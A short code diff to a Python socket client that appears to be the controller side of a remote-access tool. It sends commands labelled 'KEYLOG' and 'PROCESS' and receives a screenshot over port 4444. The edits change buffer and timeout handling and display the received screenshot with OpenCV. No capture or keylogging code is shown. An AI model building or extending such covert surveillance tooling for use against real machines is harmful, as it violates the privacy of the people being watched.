@@ -4,6 +4,7 @@ import tkinter as tk
 from tkinter import messagebox
 import gui
 import logging
+import cv2
 
 HOST = '127.0.0.1'
 PORT = 4444
@@ -90,15 +91,19 @@ class Client:
                 with open(filename, 'wb') as fw:
                     while True:
                         print("Receiving data")
-                        self.Cli_Sock.settimeout(10)  # Set a timeout of 10 seconds
-                        data = self.Cli_Sock.recv(1024)
+                        #self.Cli_Sock.settimeout(20)  # Set a timeout of 20 seconds
+                        data = self.Cli_Sock.recv(4096)
                         if not data:
                             break
                         fw.write(data)
                     fw.close()
                 break 
             print("Done")
-               
+            img = cv2.imread("screenshot.png", cv2.IMREAD_ANYCOLOR)
+            while True:
+                cv2.imshow("screenshot", img)
+                cv2.waitKey(0)
+                sys.exit(0)
         elif res == "KEYLOG":
             print(res)
         elif res == "PROCESS":
